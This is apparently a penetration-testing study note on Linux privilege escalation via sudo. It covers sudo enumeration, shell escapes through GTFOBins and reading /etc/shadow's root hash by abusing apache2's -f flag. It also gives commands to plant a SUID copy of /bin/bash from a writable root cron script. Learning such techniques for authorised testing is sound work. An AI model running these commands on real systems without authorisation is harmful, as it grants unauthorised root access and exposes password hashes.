**Check Sudo Version**
```
sudo --version
```
  

**Check Sudo Permissions**
```
sudo -l
```


**Run Programs as a Specific User**
```
sudo -u <user> <program>
```


**Switching to Root with Known Password**
```
sudo su

# if su isn't allowed
sudo -s
sudo -i
sudo /bin/bash
sudo passwd
```


**Shell Escape Sequences**
even if restricted to running certain programs via sudo, it is sometimes possible to "escape" the program and spawn a shell
- since the initial program runs with root, so does the spawned shell
- list of programs and their escape sequences can be found on [GTFOBins](https://gtfobins.github.io)


**Abusing Intended Functionality**
- if we can read files owned by root, we can extract useful information
- if we can write files owned by root, we can insert or modify information

- Apache2 Example
	- does not have shell escape sequences
	- however, when run as root with `-f`, it'll output an error for the first line it doesn't understand - root hash is in the first line of `/etc/shadow`
![](assets/Pasted%20image%2020260531151745.png)


**Copying /bin/bash**
- if you have a scenario where you can execute commands (such as a backup script crontab that you can write to) you can put the following at the end of the file and once it runs you can get root
```
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
```
![image 165.png](../../Linux%20Checklist/assets/Sudo/image%20165.png)
![image 1 125.png](../../Linux%20Checklist/assets/Sudo/image%201%20125.png)



**Example**

using linenum with no password
![](assets/Pasted%20image%2020260531151447.png)

go to gtfobins and search for "find"
![](assets/Pasted%20image%2020260531151514.png)
- copy paste command to gain a root shell